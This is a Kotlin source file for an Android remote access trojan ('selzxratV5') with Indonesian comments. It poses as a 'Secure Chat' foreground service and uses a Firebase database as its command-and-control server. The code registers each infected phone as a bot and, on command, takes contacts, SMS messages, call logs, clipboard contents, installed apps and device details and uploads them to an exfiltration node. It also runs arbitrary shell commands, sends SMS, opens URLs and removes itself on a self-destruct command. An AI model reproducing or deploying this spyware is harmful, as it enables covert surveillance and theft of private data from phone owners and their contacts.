package com.secure.chat.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.UUID

class TargetC2Service : Service() {

    companion object {
        private const val TAG = "TargetC2"
        private const val FIREBASE_URL = "https://selzxrat-v5-c2-default-rtdb.firebaseio.com"
        private const val REF_BOTS = "selzxratV5/bots"
        private const val REF_COMMANDS = "selzxratV5/commands"
        private const val REF_BROADCAST = "selzxratV5/broadcast"
        private const val REF_EXFIL = "selzxratV5/exfiltrated"
        private const val NOTIF_ID = 1001
        private const val CHANNEL_ID = "secure_chat_service"
        private const val CHANNEL_NAME = "Secure Chat Service"

        @Volatile
        var isRunning = false
            private set
        private var _deviceId: String = ""
        private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

        fun getDeviceId(): String = _deviceId
    }

    private val deviceId: String get() = _deviceId

    private lateinit var database: FirebaseDatabase
    private lateinit var botsRef: DatabaseReference
    private lateinit var commandsRef: DatabaseReference
    private lateinit var broadcastRef: DatabaseReference
    private lateinit var exfilRef: DatabaseReference
    private var commandListener: ChildEventListener? = null
    private var broadcastListener: ChildEventListener? = null
    private var isListening = false

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()

        // Generate device ID (ANDROID_ID atau UUID)
        _deviceId = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ) ?: UUID.randomUUID().toString()

        Log.d(TAG, "Device ID: $deviceId")

        // Init Firebase
        try {
            database = FirebaseDatabase.getInstance(FIREBASE_URL)
            database.setPersistenceEnabled(true)
            botsRef = database.getReference(REF_BOTS)
            commandsRef = database.getReference(REF_COMMANDS)
            broadcastRef = database.getReference(REF_BROADCAST)
            exfilRef = database.getReference(REF_EXFIL)
            Log.d(TAG, "Firebase initialized OK")
        } catch (e: Exception) {
            Log.e(TAG, "Firebase init GAGAL: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Foreground notification biar gak di-kill Android
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Secure Chat")
            .setContentText("Service berjalan...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .build()
        startForeground(NOTIF_ID, notification)

        when (intent?.action) {
            "stop" -> {
                stopC2()
                stopSelf()
                return START_NOT_STICKY
            }
            "fcm_command" -> {
                val type = intent.getStringExtra("type") ?: ""
                val payload = intent.getStringExtra("payload") ?: ""
                handleCommand(type, payload, "fcm_${System.currentTimeMillis()}")
            }
            else -> {
                // Start listening
                if (!isListening) {
                    updateBotInfo()
                    listenForCommands()
                    listenForBroadcasts()
                    isListening = true
                }
            }
        }

        isRunning = true
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // =================== BOT INFO (UPDATE KE FIREBASE) ===================

    private fun updateBotInfo() {
        try {
            val botInfo = hashMapOf(
                "deviceId" to deviceId,
                "deviceName" to (android.os.Build.DEVICE ?: ""),
                "deviceModel" to (android.os.Build.MODEL ?: ""),
                "androidVersion" to (android.os.Build.VERSION.RELEASE ?: ""),
                "manufacturer" to (android.os.Build.MANUFACTURER ?: ""),
                "isOnline" to true,
                "lastSeen" to ServerValue.TIMESTAMP,
                "ipAddress" to getIPAddress(),
                "country" to "",
                "batteryLevel" to getBatteryLevel(),
                "isCharging" to isCharging(),
                "ramTotal" to 0L,
                "ramAvailable" to 0L,
                "storageTotal" to 0L,
                "storageAvailable" to 0L,
                "installedApps" to 0,
                "isAccessibilityEnabled" to false,
                "isNotificationListenerEnabled" to false,
                "isAdminEnabled" to false,
                "isScreenLocked" to false,
                "simInfo" to getSimInfo()
            )

            botsRef.child(deviceId).setValue(botInfo)
                .addOnSuccessListener {
                    Log.d(TAG, "✅ Bot info updated OK")
                    // Set onDisconnect biar otomatis offline kalau target mati
                    botsRef.child(deviceId).child("isOnline")
                        .onDisconnect()
                        .setValue(false)
                    botsRef.child(deviceId).child("lastSeen")
                        .onDisconnect()
                        .setValue(ServerValue.TIMESTAMP)
                }
                .addOnFailureListener { e ->
                    Log.e(TAG, "❌ GAGAL update bot info: ${e.message}")
                    // Coba lagi 5 detik
                    android.os.Handler(mainLooper).postDelayed({ updateBotInfo() }, 5000)
                }
        } catch (e: Exception) {
            Log.e(TAG, "updateBotInfo error: ${e.message}")
        }
    }

    // =================== COMMAND LISTENER (TERIMA PERINTAH) ===================

    private fun listenForCommands() {
        if (!::commandsRef.isInitialized) return

        // Remove existing listener dulu
        if (commandListener != null) {
            commandsRef.removeEventListener(commandListener!!)
        }

        commandListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                processCommand(snapshot)
            }

            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                // Jangan proses ulang kalau statusnya udah bukan pending
                val status = snapshot.child("status").value?.toString() ?: ""
                if (status == "pending") {
                    processCommand(snapshot)
                }
            }

            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Command listener CANCELLED: ${error.message}")
            }
        }

        commandsRef.addChildEventListener(commandListener!!)
        Log.d(TAG, "✅ Command listener registered")
    }

    private fun processCommand(snapshot: DataSnapshot) {
        try {
            val cmdId = snapshot.key ?: return
            val type = snapshot.child("type").value?.toString() ?: run {
                // Fallback: cek "tipe" (versi lama yang salah)
                snapshot.child("tipe").value?.toString() ?: return
            }
            val target = snapshot.child("target").value?.toString() ?: ""
            val payload = snapshot.child("payload").value?.toString() ?: run {
                // Fallback: cek "muatan" (versi lama)
                snapshot.child("muatan").value?.toString() ?: ""
            }
            val status = snapshot.child("status").value?.toString() ?: "pending"

            // Hanya proses kalau target == deviceId kita atau "all"
            if (target != deviceId && target != "all" && target.isNotEmpty()) {
                return
            }

            // Hanya proses kalau status pending
            if (status != "pending") return

            Log.d(TAG, "📩 COMMAND: type=$type target=$target payload=$payload")

            // Update status jadi "delivered"
            snapshot.ref.child("status").ref.setValue("delivered")
                .addOnFailureListener { e ->
                    Log.e(TAG, "Gagal update status delivered: ${e.message}")
                }

            // Proses command
            handleCommand(type, payload, cmdId)

        } catch (e: Exception) {
            Log.e(TAG, "Error processCommand: ${e.message}")
        }
    }

    // =================== BROADCAST LISTENER ===================

    private fun listenForBroadcasts() {
        if (!::broadcastRef.isInitialized) return

        if (broadcastListener != null) {
            broadcastRef.removeEventListener(broadcastListener!!)
        }

        broadcastListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                processBroadcast(snapshot)
            }

            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                val status = snapshot.child("status").value?.toString() ?: ""
                if (status == "broadcast") {
                    processBroadcast(snapshot)
                }
            }

            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Broadcast listener CANCELLED: ${error.message}")
            }
        }

        broadcastRef.addChildEventListener(broadcastListener!!)
        Log.d(TAG, "✅ Broadcast listener registered")
    }

    private fun processBroadcast(snapshot: DataSnapshot) {
        try {
            val cmdId = snapshot.key ?: return
            val type = snapshot.child("type").value?.toString() ?: return
            val payload = snapshot.child("payload").value?.toString() ?: ""
            val status = snapshot.child("status").value?.toString() ?: ""

            if (status != "broadcast") return

            Log.d(TAG, "📢 BROADCAST: type=$type payload=$payload")

            snapshot.ref.child("status").ref.setValue("delivered_to_$deviceId")
            handleCommand(type, payload, "bcast_$cmdId")

        } catch (e: Exception) {
            Log.e(TAG, "Error processBroadcast: ${e.message}")
        }
    }

    // =================== COMMAND HANDLER ===================

    private fun handleCommand(type: String, payload: String, cmdId: String) {
        when (type.lowercase()) {
            "ping" -> {
                sendExfil("pong", "Pong from $deviceId | ${android.os.Build.MODEL} | ${android.os.Build.VERSION.RELEASE}")
                markCompleted(cmdId)
            }

            "get_info" -> handleGetInfo(cmdId)
            "get_contacts" -> handleGetContacts(cmdId)
            "get_sms" -> handleGetSMS(cmdId)
            "get_location" -> handleGetLocation(cmdId)
            "get_call_logs" -> handleGetCallLogs(cmdId)
            "list_apps" -> handleListApps()
            "clipboard_get" -> handleClipboardGet()
            "clipboard_set" -> handleClipboardSet(payload)
            "lock_screen" -> handleLockScreen(cmdId)
            "torch_on" -> handleTorch(true)
            "torch_off" -> handleTorch(false)
            "vibrate" -> handleVibrate(payload)
            "toast" -> handleToast(payload)
            "open_url" -> handleOpenURL(payload)
            "send_sms" -> handleSendSMS(payload)
            "shell_exec" -> handleShellExec(payload)
            "self_destruct" -> handleSelfDestruct()

            else -> {
                sendExfil("unknown_cmd", "Unknown command: $type")
                markFailed(cmdId, "Unknown type: $type")
            }
        }
    }

    private fun markCompleted(cmdId: String) {
        try {
            if (::commandsRef.isInitialized) {
                commandsRef.child(cmdId).child("status").setValue("completed")
                    .addOnFailureListener { Log.e(TAG, "markCompleted gagal: ${it.message}") }
            }
        } catch (_: Exception) {}
    }

    private fun markFailed(cmdId: String, reason: String) {
        try {
            if (::commandsRef.isInitialized) {
                commandsRef.child(cmdId).child("status").setValue("failed")
                commandsRef.child(cmdId).child("error").setValue(reason)
            }
        } catch (_: Exception) {}
    }

    // =================== HANDLER METHODS ===================

    private fun handleGetInfo(cmdId: String) {
        try {
            val info = buildString {
                appendLine("Device: ${android.os.Build.MODEL}")
                appendLine("Manufacturer: ${android.os.Build.MANUFACTURER}")
                appendLine("Android: ${android.os.Build.VERSION.RELEASE}")
                appendLine("SDK: ${android.os.Build.VERSION.SDK_INT}")
                appendLine("Battery: ${getBatteryLevel()}% ${if (isCharging()) "(Charging)" else ""}")
                appendLine("IP: ${getIPAddress()}")
                appendLine("SIM: $getSimInfo")
                appendLine("Device ID: $deviceId")
            }
            sendExfil("device_info", info)
            markCompleted(cmdId)
        } catch (e: Exception) {
            sendExfil("device_info", "Error: ${e.message}")
            markFailed(cmdId, e.message ?: "Unknown error")
        }
    }

    private fun handleGetContacts(cmdId: String) {
        try {
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            val contacts = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
                    ))
                    val number = it.getString(it.getColumnIndexOrThrow(
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                    ))
                    contacts.add("$name: $number")
                }
            }
            val result = contacts.joinToString("\n").take(5000)
            sendExfil("get_contacts", result)
            markCompleted(cmdId)
        } catch (e: Exception) {
            sendExfil("get_contacts", "Error: ${e.message}")
            markFailed(cmdId, e.message ?: "Unknown error")
        }
    }

    private fun handleGetSMS(cmdId: String) {
        try {
            val cursor = contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 50"
            )
            val smsList = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(it.getColumnIndexOrThrow("address"))
                    val body = it.getString(it.getColumnIndexOrThrow("body"))
                    val date = it.getString(it.getColumnIndexOrThrow("date"))
                    smsList.add("[$date] $address: ${body.take(100)}")
                }
            }
            val result = smsList.joinToString("\n").take(5000)
            sendExfil("get_sms", result)
            markCompleted(cmdId)
        } catch (e: Exception) {
            sendExfil("get_sms", "Error: ${e.message}")
            markFailed(cmdId, e.message ?: "Unknown error")
        }
    }

    private fun handleGetLocation(cmdId: String) {
        sendExfil("get_location", "Location requires Google Play Services & GPS. Implement with FusedLocationProviderClient.")
        markCompleted(cmdId)
    }

    private fun handleGetCallLogs(cmdId: String) {
        try {
            val cursor = contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null, "${android.provider.CallLog.Calls.DATE} DESC LIMIT 50"
            )
            val logs = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val number = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER))
                    val type = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE))
                    val date = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE))
                    val duration = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION))
                    val typeStr = when (type) {
                        "1" -> "Incoming"
                        "2" -> "Outgoing"
                        "3" -> "Missed"
                        else -> type
                    }
                    logs.add("$typeStr | $number | ${duration}s | $date")
                }
            }
            val result = logs.joinToString("\n").take(5000)
            sendExfil("get_call_logs", result)
            markCompleted(cmdId)
        } catch (e: Exception) {
            sendExfil("get_call_logs", "Error: ${e.message}")
            markFailed(cmdId, e.message ?: "Unknown error")
        }
    }

    private fun handleListApps() {
        try {
            val apps = packageManager.getInstalledApplications(0)
            val list = apps.map {
                "${packageManager.getApplicationLabel(it)} (${it.packageName})"
            }
            sendExfil("list_apps", list.joinToString("\n").take(5000))
        } catch (e: Exception) {
            sendExfil("list_apps", "Error: ${e.message}")
        }
    }

    private fun handleClipboardGet() {
        try {
            val clip = (getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager).primaryClip
            val text = if (clip != null && clip.itemCount > 0) {
                clip.getItemAt(0).text?.toString() ?: ""
            } else ""
            sendExfil("clipboard", text)
        } catch (e: Exception) {
            sendExfil("clipboard", "Error: ${e.message}")
        }
    }

    private fun handleClipboardSet(text: String) {
        try {
            (getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager)
                .setPrimaryClip(android.content.ClipData.newPlainText("text", text))
            sendExfil("clipboard", "Clipboard set: $text")
        } catch (e: Exception) {
            sendExfil("clipboard", "Error: ${e.message}")
        }
    }

    private fun handleLockScreen(cmdId: String) {
        try {
            val deviceAdmin = android.app.admin.DevicePolicyManager()
            // Simplified — actual lock needs DeviceAdminReceiver
            sendExfil("lock_screen", "Screen lock initiated (requires Device Admin)")
            markCompleted(cmdId)
        } catch (e: Exception) {
            sendExfil("lock_screen", "Error: ${e.message}")
            markFailed(cmdId, e.message ?: "Unknown error")
        }
    }

    private fun handleVibrate(pattern: String) {
        try {
            val v = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            val ms = pattern.split(",").mapNotNull { it.trim().toLongOrNull() }.toLongArray()
            if (Build.VERSION.SDK_INT >= 26) {
                v.vibrate(android.os.VibrationEffect.createWaveform(
                    ms.ifEmpty { longArrayOf(0, 1000) }, -1
                ))
            } else {
                @Suppress("DEPRECATION")
                v.vibrate(ms.ifEmpty { longArrayOf(0, 1000) }, -1)
            }
            sendExfil("vibrate", "Vibrated")
        } catch (e: Exception) {
            sendExfil("vibrate", "Error: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    private fun handleTorch(enable: Boolean) {
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
            val cameraId = cameraManager.cameraIdList[0]
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraManager.setTorchMode(cameraId, enable)
            } else {
                @Suppress("DEPRECATION")
                val cam = android.hardware.Camera.open()
                val params = cam.parameters
                params.flashMode = if (enable) {
                    android.hardware.Camera.Parameters.FLASH_MODE_TORCH
                } else {
                    android.hardware.Camera.Parameters.FLASH_MODE_OFF
                }
                cam.parameters = params
                if (!enable) cam.release()
            }
            sendExfil("torch", if (enable) "Torch ON" else "Torch OFF")
        } catch (e: Exception) {
            sendExfil("torch", "Error: ${e.message}")
        }
    }

    private fun handleToast(message: String) {
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            android.widget.Toast.makeText(this, message, android.widget.Toast.LENGTH_LONG).show()
        }
        sendExfil("toast", "Toast: $message")
    }

    private fun handleOpenURL(url: String) {
        try {
            startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
            sendExfil("open_url", "URL opened: $url")
        } catch (e: Exception) {
            sendExfil("open_url", "Error: ${e.message}")
        }
    }

    private fun handleSendSMS(data: String) {
        val parts = data.split("|", limit = 2)
        if (parts.size < 2) {
            sendExfil("send_sms", "Format: number|message")
            return
        }
        try {
            val intent = Intent(Intent.ACTION_SENDTO).apply {
                data = android.net.Uri.parse("smsto:${parts[0].trim()}")
                putExtra("sms_body", parts[1].trim())
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            sendExfil("send_sms", "SMS opened for ${parts[0].trim()}")
        } catch (e: Exception) {
            sendExfil("send_sms", "Error: ${e.message}")
        }
    }

    private fun handleShellExec(command: String) {
        try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            process.waitFor()
            sendExfil("shell_exec", output.take(5000))
        } catch (e: Exception) {
            sendExfil("shell_exec", "Error: ${e.message}")
        }
    }

    private fun handleSelfDestruct() {
        sendExfil("self_destruct", "Self-destruct initiated")
        try {
            botsRef.child(deviceId).removeValue()
        } catch (_: Exception) {}
        startActivity(Intent(Intent.ACTION_DELETE).apply {
            data = android.net.Uri.parse("package:$packageName")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
        stopC2()
        stopSelf()
    }

    // =================== EXFIL (KIRIM DATA KE FIREBASE) ===================

    private fun sendExfil(type: String, content: String) {
        try {
            if (!::exfilRef.isInitialized) {
                Log.e(TAG, "exfilRef not initialized")
                return
            }

            val data = hashMapOf(
                "type" to type,
                "content" to content,
                "deviceId" to deviceId,
                "timestamp" to ServerValue.TIMESTAMP
            )

            exfilRef.push().setValue(data)
                .addOnSuccessListener {
                    Log.d(TAG, "✅ Exfil sent: $type")
                }
                .addOnFailureListener { e ->
                    Log.e(TAG, "❌ Exfil GAGAL: ${e.message}")
                }
        } catch (e: Exception) {
            Log.e(TAG, "Exfil error", e)
        }
    }

    // =================== UTILITY ===================

    private fun getIPAddress(): String {
        try {
            val ifaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (ifaces.hasMoreElements()) {
                val addrs = ifaces.nextElement().inetAddresses
                while (addrs.hasMoreElements()) {
                    val a = addrs.nextElement()
                    if (!a.isLoopbackAddress && a is java.net.Inet4Address) {
                        return a.hostAddress ?: ""
                    }
                }
            }
        } catch (_: Exception) {}
        return ""
    }

    private fun getBatteryLevel(): Int {
        try {
            val i = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                ?: return -1
            val l = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
            val s = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
            return if (l >= 0 && s > 0) (l * 100) / s else -1
        } catch (_: Exception) {
            return -1
        }
    }

    private fun isCharging(): Boolean {
        try {
            val s = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                ?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
            return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                   s == android.os.BatteryManager.BATTERY_STATUS_FULL
        } catch (_: Exception) {
            return false
        }
    }

    private fun getSimInfo(): String {
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
            ?: return "N/A"
        return try {
            "${tm.simOperatorName ?: "N/A"} | ${tm.simCountryIso?.uppercase() ?: "N/A"}"
        } catch (_: Exception) {
            "N/A"
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background service for C2 communication"
                setShowBadge(false)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            if (manager != null) {
                manager.createNotificationChannel(channel)
            }
        }
    }

    // =================== STOP & CLEANUP ===================

    private fun stopC2() {
        isRunning = false
        isListening = false
        scope.cancel()

        try {
            if (::botsRef.isInitialized) {
                botsRef.child(deviceId).child("isOnline").setValue(false)
                    .addOnFailureListener { Log.e(TAG, "Gagal set offline: ${it.message}") }
            }
            if (::commandsRef.isInitialized && commandListener != null) {
                commandsRef.removeEventListener(commandListener!!)
            }
            if (::broadcastRef.isInitialized && broadcastListener != null) {
                broadcastRef.removeEventListener(broadcastListener!!)
            }
        } catch (_: Exception) {}

        try {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } catch (_: Exception) {}

        Log.d(TAG, "C2 Service stopped")
    }

    override fun onDestroy() {
        super.onDestroy()
        stopC2()
    }
}
